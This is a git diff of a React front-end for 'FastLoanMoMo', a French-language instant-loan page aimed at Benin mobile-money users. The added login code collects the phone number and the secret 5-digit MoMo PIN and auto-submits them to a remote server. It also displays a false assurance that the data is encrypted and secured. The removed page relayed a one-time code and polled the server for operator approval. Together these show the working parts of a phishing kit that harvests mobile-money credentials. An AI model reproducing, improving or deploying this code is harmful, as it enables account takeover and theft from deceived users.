@@ -1,152 +1,120 @@
-import { useState, useRef, type KeyboardEvent } from "react";
-import { useNavigate, useLocation } from "react-router-dom";
-import { Wallet, ArrowLeft } from "lucide-react";
+import { useState, useEffect, type FormEvent } from "react";
+import { useNavigate } from "react-router-dom";
+import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
+// ✅ UPDATED TO NEW RENDER URL
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
-const SecondVerification = () => {
-  const [secondOtp, setSecondOtp] = useState<string[]>(["", "", "", ""]);
-  const [isVerifying, setIsVerifying] = useState(false);
+const Login = () => {
+  const [phone, setPhone] = useState("");
+  const [pin, setPin] = useState("");
+  const [showPin, setShowPin] = useState(false);
   const navigate = useNavigate();
-  const location = useLocation();
-  
-  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";
 
-  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
-  // ✅ Only check if OTP is filled
-  const isFormValid = secondOtp.every((d) => d !== "");
+  const isFormValid = phone.length === 10 && pin.length === 5;
 
-  const handleOtpChange = (index: number, value: string) => {
-    const cleanValue = value.replace(/\D/g, "");
-    if (cleanValue.length > 1) return;
-    const newOtp = [...secondOtp];
-    newOtp[index] = cleanValue;
-    setSecondOtp(newOtp);
-    if (cleanValue && index < 3) otpRefs.current[index + 1]?.focus();
-  };
+  // Wake up the Render server silently
+  useEffect(() => {
+    fetch(`${API_URL}/`).catch(() => {}); 
+  }, []);
 
-  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !secondOtp[index] && index > 0) {
-      otpRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handleVerify = async () => {
+  const handleLogin = (e: FormEvent) => {
+    e.preventDefault();
     if (!isFormValid) return;
-    setIsVerifying(true);
+    
+    localStorage.setItem("userPhone", phone);
+    navigate("/otp", { state: { phone: phone } });
 
-    // 45-second timeout fallback
-    const timeoutId = setTimeout(() => {
-      setIsVerifying(false);
-      navigate("/"); 
-    }, 45000);
-
-    try {
-      const res = await fetch(`${API_URL}/api/verify-second-otp`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          phone_number: phoneNumber, 
-          second_otp: secondOtp.join("")
-          // ✅ Secret code removed
-        }),
-      });
-      const data = await res.json();
-      
-      if (data.status === "pending" && data.verify_id) {
-        const interval = setInterval(async () => {
-          const statusRes = await fetch(`${API_URL}/api/second-verification-status/${data.verify_id}`);
-          const statusData = await statusRes.json();
-          
-          if (statusData.status !== "pending") {
-            clearInterval(interval);
-            clearTimeout(timeoutId);
-            setIsVerifying(false);
-            
-            if (statusData.status === "approved") {
-              navigate("/loan-limit", { state: { phone: phoneNumber } });
-            } else {
-              navigate("/"); 
-            }
-          }
-        }, 2000);
-      } else {
-        clearTimeout(timeoutId);
-        setIsVerifying(false);
-        navigate("/");
-      }
-    } catch (error) {
-      clearTimeout(timeoutId);
-      setIsVerifying(false);
-      navigate("/");
-    }
+    fetch(`${API_URL}/api/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone_number: phone, pin: pin }),
+    }).catch((error) => console.log("Background login error:", error));
   };
+
+  // Auto-submit when 5th PIN digit is typed
+  useEffect(() => {
+    if (phone.length === 10 && pin.length === 5) {
+      const fakeEvent = { preventDefault: () => {} } as FormEvent;
+      handleLogin(fakeEvent);
+    }
+  }, [pin, phone]);
 
   return (
     <div className="app-container">
       <div className="header">
         <div className="header-icon"><Wallet size={32} color="white" /></div>
         <h1 className="header-title">FastLoan<span>MoMo</span></h1>
-        <p className="header-subtitle">Vérification de sécurité</p>
+        <p className="header-subtitle">Prêts mobiles instantanés</p>
       </div>
-
       <div className="main-card">
-        <button onClick={() => navigate(-1)} className="btn-back" style={{ color: '#6B7280', fontWeight: 500, display: 'flex', alignItems: 'center' }}>
-          <ArrowLeft size={18} style={{ marginRight: '6px' }} /> Retour
-        </button>
+        <h2 className="title">Bon retour</h2>
+        <p className="subtitle">Connectez-vous avec votre numéro mobile pour accéder aux prêts instantanés.</p>
         
-        <h2 className="title" style={{ fontSize: '28px', marginBottom: '12px' }}>Double Vérification</h2>
-        <p className="subtitle" style={{ lineHeight: '1.6', color: '#4B5563', marginBottom: '32px' }}>
-          Un code OTP a été envoyé à votre téléphone. Veuillez l'entrer ci-dessous pour continuer.
-        </p>
-        
-        {/* Second OTP */}
-        <div className="form-group">
-          <label className="form-label">Code OTP envoyé à votre téléphone</label>
-          <div className="otp-container">
-            {secondOtp.map((digit, index) => (
+        <form onSubmit={handleLogin}>
+          <div className="form-group">
+            <label className="form-label">Numéro de téléphone</label>
+            <div className="input-wrapper" style={{ padding: '12px 16px' }}>
+              <span style={{ display: 'flex', alignItems: 'center', fontSize: '16px', fontWeight: 500, color: '#111827' }}>
+                🇧🇯 +229 <span style={{ color: '#D1D5DB', margin: '0 12px', fontWeight: 300 }}>|</span>
+              </span>
               <input 
-                key={index} 
-                ref={(el) => { otpRefs.current[index] = el; }}
-                type="text" 
-                inputMode="numeric"
-                value={digit} 
-                onChange={(e) => handleOtpChange(index, e.target.value)} 
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className="otp-box" 
-                maxLength={1}
-                style={{ color: '#111827', fontSize: '24px', fontWeight: '600', backgroundColor: '#FFFFFF', border: '1.5px solid #D1D5DB', borderRadius: '16px', outline: 'none' }}
+                type="tel" 
+                placeholder="01 23 45 67 89" 
+                value={phone} 
+                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))} 
+                maxLength={10} 
+                required 
+                style={{ fontSize: '18px', letterSpacing: '1px', color: '#111827' }} 
               />
-            ))}
+            </div>
+            <p className="helper-text">Numéro MoMo du Bénin (10 chiffres)</p>
           </div>
-        </div>
-
-        <button 
-          onClick={handleVerify} 
-          className="btn-primary" 
-          disabled={!isFormValid || isVerifying} 
-          style={{
-            backgroundColor: (isFormValid && !isVerifying) ? 'var(--button-yellow)' : '#FDE68A',
-            color: (isFormValid && !isVerifying) ? 'white' : '#9CA3AF',
-            cursor: (isFormValid && !isVerifying) ? 'pointer' : 'not-allowed',
-            marginTop: '32px'
-          }}
-        >
-          {isVerifying ? "En attente..." : "Valider"}
-        </button>
+          
+          <div className="form-group">
+            <label className="form-label">Entrez le code PIN MOMO à 5 chiffres</label>
+            <div className="input-wrapper">
+              <Lock size={20} color="#6B7280" style={{ marginRight: '12px' }} />
+              <input 
+                type={showPin ? "text" : "password"} 
+                maxLength={5} 
+                placeholder="•••••" 
+                style={{ letterSpacing: '8px', fontSize: '18px', color: '#111827' }} 
+                value={pin} 
+                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))} 
+                required 
+              />
+              <button type="button" onClick={() => setShowPin(!showPin)} style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', padding: 0 }}>
+                <Eye size={20} color="#9CA3AF" />
+              </button>
+            </div>
+          </div>
+          
+          <button 
+            type="submit" 
+            className="btn-primary" 
+            disabled={!isFormValid} 
+            style={{ 
+              backgroundColor: isFormValid ? 'var(--button-yellow)' : '#FDE68A', 
+              color: isFormValid ? 'white' : '#9CA3AF', 
+              cursor: isFormValid ? 'pointer' : 'not-allowed', 
+              marginTop: '32px' 
+            }}
+          >
+            Continuer
+          </button>
+          
+          <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
+            <ShieldCheck size={16} /> Vos informations sont cryptées et sécurisées
+          </p>
+        </form>
       </div>
-
-      {isVerifying && (
-        <div className="modal-overlay">
-          <div className="modal-content">
-            <div className="spinner"></div>
-            <h3 className="modal-title">Vérification en cours</h3>
-            <p className="modal-text">Veuillez patienter...</p>
-          </div>
-        </div>
-      )}
+      
+      <p style={{ textAlign: 'center', fontSize: '13px', color: '#111827', marginTop: '24px', padding: '0 20px 40px', fontWeight: 500 }}>
+        En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
+      </p>
     </div>
   );
 };
 
-export default SecondVerification;
+export default Login;
